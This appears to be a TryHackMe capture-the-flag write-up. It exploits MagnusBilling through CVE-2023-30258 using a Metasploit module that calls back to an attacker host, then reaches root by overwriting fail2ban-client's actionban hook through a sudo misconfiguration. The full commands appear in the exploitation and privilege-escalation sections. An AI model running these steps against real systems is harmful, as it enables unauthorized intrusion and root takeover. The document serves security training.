TryHackMe — Billing Room Writeup
Overview
Field	Detail
Target	MagnusBilling (VoIP billing system)
Vulnerability	CVE-2023-30258 — Unauthenticated Command Injection
Privilege Escalation	Sudo misconfiguration on fail2ban-client
User	asterisk
Root	root

1. Reconnaissance
Port Scan
Ran an Nmap scan against the target:

nmap -sC -sV -oA scan 10.48.134.237

Results:

Port	Service	Notes
22	SSH	OpenSSH
80	HTTP	MagnusBilling web interface at /mbilling/
3306	MySQL	MariaDB (not accessible externally)

Web Enumeration
Visited http://<target>/mbilling/ and identified the application as MagnusBilling — an open-source VoIP billing platform for Asterisk.

Searched for known vulnerabilities and found CVE-2023-30258: an unauthenticated command injection in lib/icepay/icepay.php. The democ GET parameter is passed directly into an exec() call without any sanitisation, allowing arbitrary command execution.

2. Initial Access
Exploitation
Used Metasploit's module for CVE-2023-30258:

use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS <target-ip>
set LHOST <attacker-ip>
set target 2
exploit

Note: Target 0 (PHP) and Target 1 (Unix reverse bash) both failed to establish a session. Target 2 (Linux dropper) worked.

A Meterpreter session was established as the asterisk user.

User Flag
cat /home/asterisk/user.txt

Flag: THM{...}

3. Privilege Escalation
Enumeration
Checked sudo permissions:

sudo -l

Output:

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client

The asterisk user can run fail2ban-client as root without a password.

Why This Works
fail2ban-client allows configuring jail actions. The actionban parameter defines a shell command that executes as root every time an IP is banned. By overwriting this action with our own payload, we achieve arbitrary command execution as root.

Exploitation
# Restart fail2ban to ensure it's running
sudo /usr/bin/fail2ban-client restart

# Overwrite the ban action with our payload
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport \
  actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"

# Trigger the ban (executes our command as root)
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1

# Read the flag
cat /tmp/root.txt

Root Flag
Flag: THM{...}

4. Summary
Stage	Method	Result
Recon	Nmap + web browsing	Identified MagnusBilling + CVE-2023-30258
Exploitation	Metasploit (target 2)	Unauthenticated RCE → shell as asterisk
Privilege Escalation	Sudo misconfig on fail2ban-client	Abused actionban hook → root

Key Takeaways
Always check sudo -l after getting a foothold — misconfigured sudo rights are the most common privesc vector.
Defensive tools can be weapons — fail2ban exists to protect the system, but here it was the path to root.
Identify the software early — knowing the exact application (MagnusBilling) immediately pointed to a known CVE with a public exploit.
Elaborate

